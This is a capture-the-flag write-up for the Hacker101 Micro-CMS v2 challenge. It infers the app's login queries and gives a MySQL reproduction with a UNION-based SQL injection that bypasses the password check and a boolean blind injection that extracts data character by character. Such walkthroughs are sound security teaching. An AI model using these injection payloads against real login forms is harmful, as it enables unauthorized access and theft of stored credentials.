# Hacker101: Micro-CMS v2

## Infering application vulnerable code

The only way I see that this specific UNION injection works is that if the app code does the following simple queries *exactly* to check separatly for presence of username and validity of password (this is corroborated by the fact that the UI gives specific information about validity of a user name and validity of their password):

```SQL
SELECT username FROM admins WHERE username = 'john';
SELECT password FROM admins WHERE username = 'john';
```

Standalone fully working MySQL example:

```SQL
-- INIT database
CREATE TABLE admins (
  adminID INT AUTO_INCREMENT KEY,
  username VARCHAR(255),
  password VARCHAR(255)
);

INSERT INTO admins(username, password) VALUES ('john', 'freedom123');
INSERT INTO admins(username, password) VALUES ('Robert', 'ilikegolf73');
INSERT INTO admins(username, password) VALUES ('Mohammed', 'messy83');

-- QUERY database
SELECT username FROM admins WHERE username = 'john';
SELECT password FROM admins WHERE username = 'john';

SELECT username FROM admins WHERE username = 'dummy_user' UNION SELECT "dummy_password" AS password FROM admins WHERE '1'='1';
SELECT password FROM admins WHERE username = 'dummy_user' UNION SELECT "dummy_password" AS password FROM admins WHERE '1'='1';
```

Getting information about whenever the username query returned data or not means we can extract all database data through conditionals:

```SQL
SELECT username FROM admins WHERE username = 'someone' OR SUBSTRING((SELECT username FROM admins LIMIT 1), 1, 1) > 'a';
```

